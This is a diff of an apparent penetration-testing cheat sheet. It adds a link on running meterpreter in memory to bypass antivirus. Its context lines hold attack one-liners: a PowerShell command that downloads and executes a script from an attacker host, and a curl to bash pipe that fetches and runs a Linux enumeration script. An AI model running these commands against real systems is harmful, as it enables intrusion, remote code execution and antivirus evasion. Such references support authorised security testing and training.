@@ -36,6 +36,7 @@
 * `powershell -exec bypass -noexit "IEX(New-Object Net.WebClient).downloadString('http://{kali_ip}/script.ps1')"` _From cmd launch powershell to download and exec script in memory_
 * `run post/multi/recon/local_exploit_suggester` _meterpreter local exploit suggester_
 * [Shell for valid winrm creds port 5985](https://github.com/Hackplayers/evil-winrm)
+* [Promote shell to meterpreter and bypass AV](https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/)
 
 ## Priv Esc Linux
 * `curl {kali_ip}:{port}/LinEnum.sh | /bin/bash` _Run linux enum script without dropping it on disk_
